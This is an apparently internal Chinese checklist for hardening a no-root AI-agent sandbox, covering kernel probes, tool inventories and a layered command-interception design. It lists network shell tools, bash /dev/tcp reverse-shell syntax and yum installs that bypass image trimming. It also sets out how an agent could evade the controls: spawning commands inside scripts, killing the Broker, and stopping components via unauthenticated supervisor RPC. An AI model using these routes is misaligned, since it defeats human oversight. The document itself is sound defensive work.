# 实施清单：环境确认与工作分解

> 版本：v1.2　日期：2026-11-21　配套文档：《云侧沙箱安全管控方案设计》v1.1
> 用法：第一部分逐条在目标沙箱/宿主机上执行并记录结果；第二部分按依赖顺序排期。
> 确认环境：OpenClaw webterm 沙箱（华为云 CCE K8s Pod，aarch64，内核 5.10，cgroup v1，**容器不可配、全程无 root**）
> 结果图例：✅ 已确认　⚠️ 部分确认/触发降级　⏳ 待确认　❌ 不可用（走降级路径）
> v1.1 变更：登记第一批实测结果（A1–A8 / B1–B8 / C1 / C7 / D1 / D3）及小结。
> v1.2 变更：登记 A4 平台结论（无 root、容器不可配、supervisor 机制）与 B5 源码闭环（OpenClaw 6.6 / xy_channel）；A4–A8、B5–B6、C1–C6 终态更新；小结升 v2（机制可用性重推 + 第三批实测项 T1–T8）。
> v1.3 变更：第三批实测全部闭环——T1/T2 userns ✅、T3 freezer ❌（→SIGSTOP）、T4 fanotify ❌ 全灭、T5 nnp ✅、T6 SA token 未挂载、T7/T7b supervisor 配置面（RPC 无认证）、T8 凭证暴露、T9 seccomp-notify ✅（L-C 立项）、T10/T10b Node permission ✅；K8s API 不可达。**设计文档已出 v1.2，平台需求单已成稿（docs/platform-requirements.md）**。

---

## 第一部分：环境确认清单

### A. 宿主机与内核能力（决定可用机制与降级路径）

| # | 确认项 | 命令 | 期望/判定 | 结果与结论 |
|---|--------|------|-----------|-----------|
| A1 | 内核版本 | `uname -r` | 3.10/4.x 均可；记录具体版本。影响 fanotify 特性集、无 eBPF | ⚠️ **`5.10.0-182.0.0.95.r3353_274.hce2.aarch64`**（华为云 EulerOS，**aarch64**）。与方案"3.10/4.x"假设不符：eBPF 从"不可用"变为**待实测**（5.10 特性集大概率齐备，需确认内核 config）；所有产物须按 arm64 编译；runc 老 CVE 风险面需重评 |
| A2 | AppArmor 是否启用 | `cat /sys/module/apparmor/parameters/enabled`<br>`aa-status`（宿主机） | `Y` 则可用 AppArmor profile 做路径管控；`N` 或未安装 → 降级为 bind mount + fanotify | ❌ **确认不可用**：节点文件不存在、`aa-status` 未安装 → 文件黑名单/挂载管控**确定走降级路径：bind mount + fanotify**（§4.2、工作分解-6） |
| A3 | SELinux 状态（如为 RHEL/CentOS 系） | `getenforce` | Enforcing → 方案改走 SELinux 策略而非 AppArmor，需另行评估 | ✅ `Disabled` → 无需 SELinux 策略路径 |
| A4 | seccomp 可用性 | `docker info \| grep -i seccomp` | Docker 18.09 默认开启默认 profile；确认可加自定义 profile（禁 ptrace/mount） | ❌ **容器配置不可改**（2026-11-21 平台结论）：无法在起容器时增加任何配置项，只能在现有环境基础上在容器内操作；且**任何路径都拿不到 root**。→ 容器级 seccomp/cap/securityContext 全部不可自助。残留手段：无 root 下可在**自有派生链**上做 `prctl(NO_NEW_PRIVS)` + seccomp filter（仅覆盖经 Broker 包装派生的子进程） |
| A5 | iptables owner match 模块 | 容器内或 netns 内：`iptables -m owner --help` | xt_owner 存在 → 可按 uid 控制出站。owner match 只对 OUTPUT 链本机发出包有效，符合本方案用法 | ❌ **不可行**（A4 联动）：无 root/NET_ADMIN，容器内 iptables 方案整体取消。网络管控转两条路：①**平台需求单**（C6：NetworkPolicy/egress 网关，元数据封禁已由平台实现——D1）；②容器内用户态方案 POC：**unprivileged userns + netns + 用户态网络栈**（gVisor netstack/slirp4netns 类），前提是内核允许非特权 userns（**待实测**，见小结-第三批实测项） |
| A6 | fanotify 权限事件支持 | 内核 ≥2.6.36 即有 `FAN_OPEN_PERM`；实测写个小程序注册监听验证 | 需要 CAP_SYS_ADMIN（Daemon 有）；用于文件灰名单阻塞确认 | ❌ **彻底不可用**（T4 实测，2026-11-23）：`fanotify_init` 通知类即 EPERM，PERM 类按预期 EPERM → 文件灰名单转向：确认=插件层审批；预防=userns mountns bind-ro/遮蔽（T2 ✅）；审计=inotify（workspace 范围）或 OBS 制品链替代 |
| A7 | cgroup v1 freezer | `ls /sys/fs/cgroup/freezer` | 存在 → 反连 shell 处置的"先冻结再取证"可用 | ❌ **确认不可用**（T3 实测，2026-11-23）：cgroup fs 对 sandbox 只读（Read-only file system）→ **L3 处置确定为 `SIGSTOP`→取证→`SIGKILL`**（同 uid 可行） |
| A8 | 进程身份与守护模型 | ~~确认容器可带 `--cap-add NET_ADMIN` 启动，且 Daemon（root）能为子进程降权~~ | 容器级需要 NET_ADMIN 供 Daemon 配 iptables；Agent 子进程由 Daemon 用 capset 清空 | ❌ **原模型整体推翻**（2026-11-21 平台结论）：容器登录即 sandbox 用户（uid 1001），**无法用 root 进行任何操作**，容器定义不可改。所有进程（OpenClaw gateway、exec 子进程、未来的安全组件）同 uid → **Daemon 与 Agent 之间无内核级隔离**：互可杀、互可读内存、策略缓存文件同主。**可用守护资源：容器内有 supervisord，可注册常驻子进程；supervisor 被杀 → 服务器即刻重启**（channel 侧已用 `supervisorctl` 重启 gateway，见 B5）。→ 新模型：安全组件注册为 supervisor 常驻子进程；管控缺失可自愈、可观测，但"Agent 无法杀 Daemon/改策略"的硬保证不再成立，需云侧权威 + 签名验签 + 审计兜底（详见小结 v2） |

### B. 沙箱镜像内容（攻击面 + 集成依赖）

| # | 确认项 | 命令/方法 | 影响 | 结果与结论 |
|---|--------|-----------|------|-----------|
| B1 | Python 版本 | `python3 --version`（及 `python --version`） | ≥3.8 → 可选 audit hook 减速带；记录全部解释器（python2/perl/ruby/node/lua）一并纳入扫描规则 | ✅ **Python 3.12.10** → audit hook 可用。解释器全量：perl ✓、lua ✓、node ✓（/opt/nodejs/bin/node）；无 ruby/php/python2 → 全部纳入扫描规则 |
| B2 | 危险工具清单 | `for t in nc ncat netcat socat ssh chisel frp ngrok curl wget perl ruby php lua node busybox gcc; do which $t 2>/dev/null; done` | 产出镜像裁剪清单；curl/wget 保留但走灰名单；busybox 注意其内建 nc | ✅ 已清点：**存在 ssh / curl / wget / perl / lua / node / gcc**；无 nc/ncat/netcat/socat/chisel/frp/ngrok/busybox。裁剪清单：① **ssh client 必删**（§10.2 L2 明确不预装）；② **gcc 待评估**（可在沙箱内自编译反连工具，削弱 L2 减速带；若 OpenClaw 构建链依赖则保留，靠 Broker + 网络层兜底）；③ curl/wget 保留走灰名单。⚠️ yum 可在线装 nc/socat（见 B4），裁剪只是减速带 |
| B3 | shell 类型 | `ls -l /bin/sh; bash --version` | bash 支持 `/dev/tcp` 反连语法 → 黑名单规则与 Broker 解析需覆盖 | ✅ `/bin/sh → bash 5.1.8`（openEuler 构建）→ `/dev/tcp` 反连语法可用，黑名单与 Broker 解析必须覆盖（Schema 草案已列） |
| B4 | 包管理器 | `which pip pip3 npm apt yum apk` | 存在即纳入"安装类操作默认灰名单" | ✅ **pip / pip3 / npm / yum** 存在（无 apt/apk）→ 全部默认灰名单。**yum 在线安装能力意味着"镜像不预装"可被 `yum install nmap-ncat socat` 绕过** → 防线在 Broker 灰名单 + 网络层，裁剪仅是减速带（§10.2 L2 定位正确，需强调） |
| B5 | **OpenClaw 执行链路（最高优先级）** | 阅读 OpenClaw channel 实现：它执行命令时直接 `execve("/bin/bash")`？还是有可配置的 executor/工具层？ | **决定 Broker 集成方式**：可配置执行器 → Broker 接管；写死 execve → 需要包装层（见 §C 工作分解-3）或推动 OpenClaw 改造。这是整个 P0 最大的集成风险点 | ✅ **已闭环**（2026-11-21，源码=`D:\Code\channel-0730\xy_channel`，OpenClaw **6.6**，进程以 sandbox 用户运行）。结论：**不需要自建 Exec Broker 接管 execve，插件层已有全部所需拦截点**：①OpenClaw 核心工具为 `exec`/`bash`（`params.command` 承载命令，gateway 进程内执行）；②**原生 exec 审批机制已存在**——gateway 维护审批状态，输出 "Approval required … Command/Host/CWD … /approve \<id\> \<allow-once\|allow-always\|deny\>"，channel 侧 `safe_exec/approval-bridge.ts` 已做文案改写与回译；③**`before_tool_call` 钩子可同步阻断**（返回 `{block:true, blockReason}`，CSPL `sentinel_hook.ts` 已在生产使用），`after_tool_call` 做结果审计，`before_install` 钩子可阻断 skill/plugin 安装（`plugin-scope/skill_scope_hook.ts` 已实现 hash+zip 上传+云扫+阻断）；④**CSPL 云扫链路已存在**（`src/cspl/`）：exec 命令→提取代码文件→SHA256→**上传 OBS**（`upload_file.ts`，需求 8 已部分落地）→IF1 风控 API→ACCEPT/REJECT/CLARIFY/VALIDATE。**差距（本方案要补的）**：a. CLARIFY 当前视为放行 → 必须改走审批（对接原生 /approve）；b. 扫描异常 fail-open（catch 吞掉）→ 黑/灰类目需 fail-close；c. 命令解析是空格 split，无 tokenize/base64 解码/软链展开 → 绕过面大；d. 无本地黑/白/灰名单前置，每条 exec 都依赖云侧 API → 需本地策略引擎；e. 凭证（PERSONAL-API-KEY 等）在容器内 env 文件，exec 子进程同 uid 可读 → 凭证保护需另行设计（见小结 v2）。**SDK 深挖补充**（node_modules/openclaw/dist/hook-types）：`before_tool_call` 返回值支持 **params 改写** + block + **`requireApproval`**（title/description/severity/timeoutMs/**timeoutBehavior: allow\|deny**/allowedDecisions/onResolution）→ 灰名单→审批链路原生闭环，**超时默认拒绝可配置**（拍板决策 3 落地）；另有 **`resolve_exec_env` 钩子**（exec 专属，host: gateway\|sandbox\|node，返回合并 env）→ spawn 环境注入的官方入口（PYTHONPATH/NODE_OPTIONS/LD_PRELOAD/http_proxy）。**残余 gap**：脚本**体内**派生的命令（os.system/subprocess/socket+dup2）不产生工具调用，本层拦截不可见 → 需 Exec Broker v2（见小结 v2） |
| B6 | OpenClaw 运行身份与启动方式 | 镜像 entrypoint/cmd；运行 uid | 现状是否 root；改造为非 root + 由 Daemon 派生 | ✅ 确认（2026-11-21）：OpenClaw 6.6，**进程以 sandbox 用户身份运行**（uid 1001），由 supervisord 拉起（`supervisorctl` 可重启 gateway）。无非 root 改造需求；A8 新模型下由 supervisor 负责常驻与自愈 |
| B7 | 现有挂载 | `docker inspect <容器> \| jq '.[0].Mounts'` 或 `/proc/mounts` | 清点暴露进容器的宿主路径，敏感目录加入"不挂载/只读"清单 | ⚠️ 容器内 `cat /proc/mounts` **Permission denied**（procfs 已被屏蔽，说明容器已有一定加固）→ 无法容器内清点，**需平台侧取 Pod spec / host mounts**。另提示：§10.2 L3 的 `/proc/*/fd` 扫描须以 root（Daemon）身份实测，确认不受 hidepid 等限制 |
| B8 | 环境变量中的凭证 | `env`（容器内） | 若云侧 AK/SK 在 env 中 → 必须移到 Daemon 持有、Agent 不可读（需求 7 前提） | ✅ **无明文云 AK/SK**。`PICOD_PUBLIC_KEY` 为公钥（风险低），`PICOD_AUTH_MODE=static`、TTL≈10 年 → 留意其鉴权模型与 scope 方案的衔接。⚠️ 新发现：`KUBERNETES_SERVICE_HOST` 为空（疑似平台已清理）；T6 已确认 **SA token 未挂载**（2026-11-23）→ K8s 横向凭证面不存在，平台需求单列为保持项 |

### C. 容器运行时配置

| # | 确认项 | 命令 | 期望 | 结果与结论 |
|---|--------|------|------|-----------|
| C1 | 运行用户 | `docker inspect -f '{{.Config.User}}'` | 现状记录；目标：Agent 非 root | ✅ 终态：uid 1001（sandbox），平台确认不可改。目标"Agent 非 root"天然达成；A8 新模型不再需要 root 调整 |
| C2 | 网络模式 | `docker inspect -f '{{.HostConfig.NetworkMode}}'` | **若为 `host` 必须改为 bridge**——host 模式下入站管控与 owner match 全部失效 | ❌ **关闭**（A4：容器定义不可改，现状即终态）。是否 hostNetwork 不再可控；入站管控完全转入平台需求单（C6）+ 应用层"仅监听 loopback"自律 |
| C3 | 已发布端口 | `docker port <容器>` | 目标为零；现状有则需迁移到 gateway 反代 | ❌ **关闭**（A4）：暴露面由平台现状决定，需求单化（C6） |
| C4 | privileged 标志 | `docker inspect -f '{{.HostConfig.Privileged}}'` | 必须 false | ❌ **关闭**（A4）：不可改；由平台基线保证，需求单中要求确认 |
| C5 | 只读根文件系统现状 | `docker inspect -f '{{.HostConfig.ReadonlyRootfs}}'` | 记录改造量 | ❌ **关闭**（A4）：不可改。残留手段：unprivileged userns + mountns（若内核允许）可在 Broker 派生子进程时做 bind-ro/tmpfs noexec/敏感路径遮蔽——**待实测**，见小结-第三批 |
| C6 | **容器创建参数的归属** | 找平台/基础设施团队确认：容器的 run 参数谁控制、能否改 | 非技术问题但最关键——镜像、网络模式、cap、挂载都要改容器定义，需排期协调 | ✅ 结论反转（2026-11-21）：容器定义**不可改**，本项从"协调改造"转型为**平台需求单**：①维持元数据封禁现状（D1 已封，要求不随版本退化）；②下发 NetworkPolicy（egress 默认拒绝 + 仅放行云侧服务网段与 DNS）；③确认 privileged=false、SA token 不挂载（B8）；④镜像层面裁剪 ssh 等危险工具（镜像谁构建归谁）。需求单是网络/平台类管控的**唯一**落地通道 |
| C7 | DNS 配置 | `cat /etc/resolv.conf`（容器内） | 现状指向；目标指向内部 resolver | ✅ nameserver `169.254.1.1`（node-local DNS）+ `10.247.3.10`（集群 DNS，cluster.local）。**注意：Schema 草案 `deny_ip_ranges` 含 `10.0.0.0/8` 会误杀集群 DNS → 必须先建内部 resolver 并显式例外，再封网段** |

### D. 网络拓扑

| # | 确认项 | 方法 | 影响 | 结果与结论 |
|---|--------|------|------|-----------|
| D1 | 云元数据可达性 | 容器内 `curl --max-time 2 http://169.254.169.254/` | 现状大概率可达 → 必须用 iptables 封禁（防凭证窃取横向） | ✅ **现状已不可达**（2s 超时，平台/CCE 已封）→ 仍按方案显式封禁做纵深，不依赖现状 |
| D2 | 内网可达面 | 容器内探测 RFC1918 网段常见端口（网关/DNS 除外） | 产出 `deny_ip_ranges` 终稿；确认 gateway/DNS 的例外地址 | ⚠️ 部分（2026-11-23）：**K8s API（10.247.0.1:443）不可达**（curl code 000）；集群 DNS 10.247.3.10 可达（第一批）→ 内网面初判很小，但 RFC1918 全段探测与例外终稿仍待测（可借 userns 方案落地前由平台 NetworkPolicy 覆盖） |
| D3 | 出站现状 | 容器内 `curl --max-time 3 https://example.com` | 现状直连可达 → 确认上线 iptables 后必须走 proxy 才通（验收用例） | ✅ **直连外网开放**（返回 200）→ 证实 P2（iptables + egress proxy）为必须项；上线后"不走 proxy 即不通"作为验收用例成立 |
| D4 | egress proxy 部署位置 | 与网络团队确认：同网络 sidecar 容器 vs 独立服务 | 影响 iptables 指向与 proxy 自身加固方案 | ⏳ 未启动（跨团队） |
| D5 | 内部 DNS resolver | 是否有现成内网 DNS 可加 ACL/限速 | 无则需自建（如 dnsmasq/CoreDNS + 插件） | ⏳ 未启动（跨团队） |
| D6 | TLS 拦截可行性 | 确认镜像可预置私有 CA 信任库；抽查沙箱内常用工具链（git/pip/npm/curl）是否走系统 CA | 个别客户端证书固定会失败 → 按域名白名单豁免；**拍板是否启用 tls_intercept** | ⏳ 未启动（跨团队；镜像侧 CA 预置可与工作分解-1 同步准备） |

### E. 云侧与跨团队依赖

| # | 事项 | 对接方 | 需确认内容 | 结果与结论 |
|---|------|--------|-----------|-----------|
| E1 | OpenClaw 执行链路改造 | OpenClaw 团队 | 命令执行入口可否接入 Broker（B5 结论的落地） | ⏳ 未启动（依赖 B5） |
| E2 | HIPS 接口 | **冯经理** | 事件 Schema（ts/pid/uid/事件类型/对象/判定）、传输（Unix socket/gRPC）、判定结果能否回写 Daemon 转阻断 | ⏳ 未启动 |
| E3 | 策略控制面 | 云侧团队 | 名单 CRUD、版本号、签名密钥体系、推送通道（Daemon 长连接 pull 还是云侧 push）、离线时本地缓存策略 | ⏳ 未启动 |
| E4 | 审批回调 | 前端/云侧 | 用户确认入口形态；**审批超时行为必须拍板：默认拒绝**；授权累积项的有效期与次数 | ⏳ 未启动 |
| E5 | OBS | 云侧 | bucket 规划、签名 URL 服务、存储周期、云扫服务（YARA/静态分析）算力归属 | ⏳ 未启动 |
| E6 | 授权 scope 服务 | 云侧 | scope token 格式、云侧各服务的校验接入点 | ⏳ 未启动 |

### 第一部分确认小结（v2，2026-11-21 第二批：A4 平台结论 + B5 源码闭环）

> 第一批结论（内核 5.10 aarch64、K8s/CCE、AppArmor 不可用、出站开放等）仍然有效，本节不再重复；本节记录**改变方案地基**的两个新事实及其连锁重推。

**新事实**

1. **A4 平台结论**：容器定义不可改（无法增加任何启动配置项）；**任何路径拿不到 root**，容器登录即 sandbox 用户（uid 1001）；容器内有 **supervisord**，可注册常驻子进程，supervisor 被杀 → 服务器即刻重启。
2. **B5 源码闭环**：OpenClaw **6.6**，channel 源码即 `D:\Code\channel-0730\xy_channel`；OpenClaw 进程以 sandbox 用户运行。**原生 exec 审批机制 + 插件层 before_tool_call 阻断 + CSPL 云扫/OBS 上传链路全部已存在**（详见 B5 行）。

**机制可用性重推（无 root 终态）**

| 原方案机制 | 无 root 可行性 | 替代 / 降级路径 |
|------------|----------------|-----------------|
| Daemon=root、PID 1、派生降权 Agent | ❌ | 全进程同 uid，**无内核级隔离**。安全组件注册为 **supervisor 常驻子进程**；被杀即由 supervisor 拉起，supervisor 被杀则整机重启 → "失管"可自愈、可观测，但不再是不可穿透 |
| iptables（owner match、封元数据/内网） | ❌ | ①**平台需求单**（C6）：NetworkPolicy、维持元数据封禁；②**userns+netns+Broker 用户态网络栈**（T1 实测 ✅）：exec 子进程无网 netns，唯一出站经 Broker 转发——容器内自助主路径；③应用层减速带：env 注入 `http_proxy`（可绕过，仅减速） |
| fanotify `FAN_OPEN_PERM` 文件灰名单阻塞 | ❌（T4 实测：init 即 EPERM，审计类同灭） | 灰名单**确认**上移到插件层（before_tool_call 解析命令路径 → requireApproval）；**预防**靠 userns mountns bind-ro/遮蔽（T2 ✅）；**审计**降级为 inotify（workspace 范围）或以 OBS 制品链+命令层事件替代 |
| 容器级 seccomp / cap-drop / 只读根 fs | ❌ | 容器定义不可改。替代已验证：Broker 派生链 `no_new_privs`（T5 ✅）+ seccomp filter（T9 待终验）；userns+mountns bind-ro/tmpfs noexec（T1/T2 ✅） |
| cgroup freezer 冻结 | ❌（T3 实测：cgroup fs 只读） | **`SIGSTOP`→取证→`SIGKILL`**（同 uid 可行，已定为 L3 默认处置路径） |
| 策略文件 root 拥有、Daemon 不可被杀/改 | ❌ | 策略缓存与 Agent 同主。**缓解**：云侧私钥不出控制面 → 篡改本地缓存过不了签名验证（Daemon 拒绝加载、fail-close）；破坏面从"提权"降为"破坏可用性"，叠加 supervisor 自愈 + 全量审计 |
| 凭证由 Daemon 持有、Agent 不可读 | ❌ | 同 uid 同权限，env 文件（PERSONAL-API-KEY 等）exec 子进程可读。**缓解**：云侧改发短期 scope token（对接 PICOD 鉴权模型）；即使泄露，能力受 scope 限制 + 可吊销 + 全审计 |

**B5 带来的架构简化（P0 重心转移）**

- ~~自建 root Exec Broker Daemon + Unix socket + OpenClaw 改造~~ → 裁决点上移**插件层内联拦截**：`before_tool_call` 返回 `{block, blockReason}` 或 **`requireApproval`**（原生审批，timeoutBehavior: deny 可配）；黑/白名单本地判定。**注意：工具调用层看不到脚本体内派生的命令 → Exec Broker 仍需要，形态变为"插件层裁决 + spawn 包装 + 系统调用层监听"（无 root），见下文 Broker v2。**
- 需求 3（命令三名单）＝**增强现有 CSPL 链路**：本地策略引擎前置（黑本地拦/白本地放/灰与未知走云扫+审批）＋修复现有缺口（CLARIFY 放行 → 转审批；异常 fail-open → fail-close 可配；空格 split → tokenize/base64 解码/软链展开）。
- 需求 4（批量删除审批）：插件层 tokenize 后识别 `rm -r`/通配/多目标 → 转原生审批；删除隔离区可在 sandbox 用户下做（workspace 内 quarantine 目录）。
- 需求 8（OBS）：`cspl/upload_file.ts` + `skill_scope_hook` 已覆盖主要链路 → 复用，补策略对齐与去重缓存。
- 需求 6（HIPS）：事件源 = before/after_tool_call + 审批事件 → 插件内事件总线转发（socket/HTTPS）给冯经理侧。
- 需求 5（网络）：容器内不可自助 → 平台需求单（唯一通道）+ userns POC 后置。
- 需求 7（scope）：插件持有凭证代发云侧调用；长期改为云侧短期 scope token。

**Exec Broker v2（无 root 运行时 Broker —— 回应"脚本体内攻击无法通过 exec 阻断"）**

问题确认：`before_tool_call` 只看到工具调用字符串（`python3 evil.py`），脚本**体内**的 `os.system`/`subprocess`/反连 socket 不产生工具调用；静态扫描可被混淆/eval/二阶段下载绕过；v1.1 的兜底（§4.9 内核边界）已随无 root 失效。Broker v2 分三层，越往下越"硬"、越与语言无关：

| 层 | 机制 | 覆盖 | 绕过面（诚实标注） |
|----|------|------|---------------------|
| **L-A 工具调用裁决**（已有，增强） | `before_tool_call`：tokenize/base64 解码/软链展开 → 本地三名单；黑→block；灰→`requireApproval`（timeout deny）；脚本类→内容扫描（本地规则+OBS 云扫） | LLM 发起的全部 exec/bash 工具调用 | 脚本体内行为 |
| **L-B spawn 包装**（注入） | `resolve_exec_env` 钩子注入：①`PYTHONPATH`→sitecustomize 装 **Python audit hooks**（os.system/subprocess/socket.connect/open 灰路径→抛异常+事件）；②`NODE_OPTIONS=--require` shim（node≥20 评估 `--experimental-permission`）；③`LD_PRELOAD`→execve-shim（动态二进制 execve 转发 Broker）；④`http(s)_proxy` 弱减速。脚本执行类命令可用 params 改写整体套 launcher | 解释器内行为 + 动态链接二进制 | LD_PRELOAD 对静态二进制/Go 无效；audit hook 可被 `-S`/原生扩展绕过；属减速带 |
| **L-C 系统调用裁决**（核心新增） | **seccomp user-notify**（无 root 可行：`no_new_privs=1` + `SECCOMP_FILTER_FLAG_NEW_LISTENER`，内核 5.10 具备）：launcher 在 exec 目标前装 filter（`execve`/`connect`/`bind`/`listen` → RET_USER_NOTIF），filter 跨 exec/fork 继承、目标不可移除 → **脚本体内任何语言（含静态/Go 二进制）的进程派生与网络连接都到 Broker 同步裁决**：execve→同套三名单（灰→同步拒并提示改走工具调用层审批）；connect→出站策略（仅代理/放行域，拒元数据+内网）；bind/listen→反连 bind shell 拒；全量事件入总线 | 一切派生进程的系统调用（syscall 级，与 libc 无关） | ①同 uid：Agent 可杀 Broker → supervisor 自愈+审计；②已放行进程内的纯内存操作不可见；③放行域名上的 C2（CDN 域前置）→ L1 代理行为检测+云侧 scope；④Broker 死→被挂起 syscall 返 ENOSYS（fail-closed 伤可用性）→ fd 双份托管+supervisor 拉起 |

- L-C 与 userns 的关系（**T1/T2 已通过，2026-11-23 定调**）：**网络层首选 userns 方案**——exec 子进程放入无网 netns，唯一出站经 Broker 用户态网络栈转发（零外网默认、无逐 syscall 开销、CONNECT 级策略与审计在 Broker 一点落地）；seccomp-notify 聚焦 **execve 进程派生裁决**（T9 验证后启用），connect/bind 拦截降级为 userns 不可用环境的备选。文件层：mountns bind-ro 遮蔽 + tmpfs noexec（T2 已验）为默认路径。
- 性能：execve/connect 低频，notify 开销可接受；`openat` 高频**不入** filter → 文件灰名单靠 L-A 命令解析 + userns ro-bind（T2 ✅）+ 解释器钩子（L-B）分担；fanotify 已实测全灭（T4），审计如需则 inotify（workspace 范围）。
- 事件源统一：L-A/L-B/L-C 的 verdict 与拦截事件全部进事件总线 → 需求 6（HIPS）与需求 8（OBS 审计链）共用。

**对方案 v1.1 的修改——已全部并入设计文档 v1.2（2026-11-23）**

1. 头部运行环境行与 §7 表格更新：内核 5.10 / aarch64 / K8s（华为 CCE）/ 容器不可配、无 root / 机制可用性实测终态。✅ 已并入 §7
2. 新增 K8s/无 root 落地差异：supervisor 常驻模型、平台需求单通道、SA token/元数据保持项。✅ 已并入 §3/§11 + 《平台需求单》
3. P0 范围重排：**Exec Broker v2 三层架构**（见上文）：L-A 插件层裁决（三名单 + requireApproval + 脚本扫描）、L-B spawn 包装（resolve_exec_env 注入解释器钩子/LD_PRELOAD）、L-C seccomp user-notify 系统调用裁决（T9 已验证立项）；launcher + Broker 常驻进程注册为 supervisor 子进程。✅ 已并入 §4.3/§8
4. §10 反连专项重排：netns 版 L0、Broker 网络栈版 L1、SIGSTOP 版 L3、诚实版 L4。✅ 已并入 §10
5. 新增 §11 无 root 风险披露（R1–R7）。✅ 已并入

**第三批实测项（沙箱 webterm 内执行）**

| # | 实测项 | 命令 | 判定 |
|---|--------|------|------|
| T1 | unprivileged userns + netns | `unshare -Urn true && echo USERNETS_OK`；再 `unshare -Urn sh -c 'ip link 2>/dev/null \|\| echo no ip cmd'` | ✅ **T1_USERNETS_OK**（2026-11-23）→ **Broker v2 网络硬隔离路径成立**：exec 子进程放入无网 netns，唯一出站经 Broker 用户态网络栈转发（比 secconnect-notify 逐连接拦截更硬、无逐 syscall 开销） |
| T2 | userns+mountns bind-ro | `unshare -Urm sh -c 'mount --bind /tmp /tmp && echo MOUNT_OK'` | ✅ **T2_MOUNT_OK**（2026-11-23）→ 派生链可做：bind-ro 遮蔽敏感路径、tmpfs noexec、workdir 限定（C5 的容器级只读 fs 替代落地） |
| T3 | freezer 写权限 | 安全步骤（**勿直接写根 freezer.state——会冻住整个终端**）：`mkdir /sys/fs/cgroup/freezer/t3t && sleep 300 & SPID=$!; echo $SPID > /sys/fs/cgroup/freezer/t3t/tasks; echo FROZEN > /sys/fs/cgroup/freezer/t3t/freezer.state; cat /sys/fs/cgroup/freezer/t3t/freezer.state; echo THAWED > /sys/fs/cgroup/freezer/t3t/freezer.state; kill $SPID` | ❌ **Read-only file system**（2026-11-23）：cgroup fs 对 sandbox 只读 → **freezer 不可用，L3 处置确定为 SIGSTOP→取证→SIGKILL**（同 uid 可行） |
| T4 | 非特权 fanotify | 编译/运行小程序：`fanotify_init(FAN_CLASS_NOTIF, O_RDONLY)` + `fanotify_mark(fd, FAN_MARK_ADD, FAN_OPEN, AT_FDCWD, "/home/sandbox")` | ❌ **全灭**（2026-11-23 实测）：`fanotify_init(NOTIF)` 即 EPERM（审计类也不可用）、PERM 类按预期 EPERM → **fanotify 彻底出局**。文件灰名单剩余手段：①预防靠 userns mountns bind-ro/遮蔽（T2 ✅，主路径）；②审计可用 **inotify**（非特权可用，workspace 范围内递归 watcher，代价是句柄数）或放弃文件级审计、以 OBS 制品链+命令层事件替代 |
| T5 | no_new_privs + seccomp 可装 | `python3 -c "import ctypes;print(ctypes.CDLL(None).prctl(38,1,0,0,0))"`（PR_SET_NO_NEW_PRIVS；返回 0 即成功） | ✅ **NoNewPrivs: 1**（2026-11-23）→ seccomp filter 前置条件满足，待 T9 终验 NEW_LISTENER 全链 |
| T6 | SA token 挂载 | `ls -l /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1` | ✅ **未挂载**（2026-11-23，No such file or directory）→ 无 K8s API 凭证暴露；平台需求单中列为保持项 |
| T7 | supervisor 配置面 | `supervisorctl status`、`cat /etc/supervisord*.conf 2>/dev/null \| head -30`、`ls /etc/supervisor* 2>/dev/null` | ⚠️（2026-11-23）：**Python 版 supervisord**（pid 9，`python3 -m supervisor.supervisord -c /home/sandbox/supervisord.conf`，sandbox 身份运行）；supervisorctl 不在 PATH。**配置在 `/home/sandbox/supervisord.conf`——与 Agent 同主可写** → 自愈锚点是软的。T7b 配置面已摸清：**`[inet_http_server] port=127.0.0.1:9001` 且无用户名密码 → 本地任何进程（含 Agent 的 exec 子进程）可直接调 XML-RPC 停/起/重启任意 program 甚至 shutdown supervisord**——安全组件即使注册进 supervisor 也可被 Agent 经 RPC 摘除，恢复只能靠平台重启（缓解：Broker 周期性自检 + 心跳上云，失管可观测；风险如实披露）。现有 program：`openclaw-gateway`（`openclaw gateway`，autorestart）、`self_heal.py`、`watch_paired.py`（autorestart=false）、`log_reporter.py`、`skill_dynamization.py --daemon`、`gspd-migrate-retry`（一次性）。**注册模板明确**：新增 `[program:safe-broker]`（autorestart=true, killasgroup=true）；`/opt/bin/self_heal.py` 等平台脚本在 /opt（非 sandbox 可写）→ 自愈链平台段可信，需求单中确认其行为 |
| T8 | CSPL env 文件位置与权限 | 源码已确认路径（cspl/constants.ts）：`ls -l /home/sandbox/.openclaw/.xiaoyienv`。**只看权限位，不要 cat 内容、不要贴回来**（内含 PERSONAL-API-KEY） | ⚠️（2026-11-23）：`-rw------- sandbox:sandbox` → 权限位正确但**与 Agent 同主，同 uid 即可读** → 凭证暴露成立，需求 7 必须走云侧短期 scope token（本地文件只是缓存） |
| T9 | 非特权 seccomp user-notify（**Broker v2 L-C 可行性**） | gcc 编译测试程序：`prctl(PR_SET_NO_NEW_PRIVS,1)` → `seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, …)`（execve/connect → RET_USER_NOTIF）→ fork 子进程 execve，listener 收事件并放行 | ✅ **机制成立**（2026-11-23）：STEP1 nnp OK → STEP2 filter 安装成功（notify fd=3）→ STEP3 收到子进程 execve 通知（pid=20341, nr=221）→ STEP4 CONTINUE 放行成功。无 root 下 execve 同步裁决链全通，**L-C 立项**。（贴出输出缺 STEP5/T9_PASS 尾行，疑截断，回归确认即可） |
| T10 | node 版本与权限模型 | `node --version`；若 ≥20：`NODE_OPTIONS=--experimental-permission node -e "require('fs').readFileSync('/etc/passwd')"` 观察拒绝 | ✅ **v24.15.0**（2026-11-23）→ Node **permission model** 可用。T10b 已验（2026-11-23）：**`NODE_OPTIONS=--permission` 注入成功**（T10b_OK）→ L-B Node 侧可无侵入落地：`resolve_exec_env` 注入 `NODE_OPTIONS=--permission --allow-fs-read=<workdir 等> --allow-fs-write=<workdir>`（默认拒 child_process/worker 线程/fs 全量访问）——**Node 进程的脚本体内派生可在解释器层硬断**，与 Python audit hook 同级 |
| T11 | requireApproval 链路联调 | 插件测试钩子返回 `requireApproval`：确认 OpenClaw 6.6 审批 UI、timeout deny 行为、allow-always 作用域 | 灰名单审批闭环验收（对接 E4 拍板） |

**剩余待确认（2026-11-23 更新）**

- ~~T1–T10~~ ✅ **全部可行性开关已实测闭环**：userns（T1/T2）、no_new_privs+seccomp-notify（T5/T9）、SIGSTOP 路径（T3）、Node permission（T10/T10b）、fanotify 出局（T4）、supervisor 配置面（T7/T7b）、凭证暴露（T8）、SA token 未挂载（T6）、K8s API 不可达（D2 小样）；
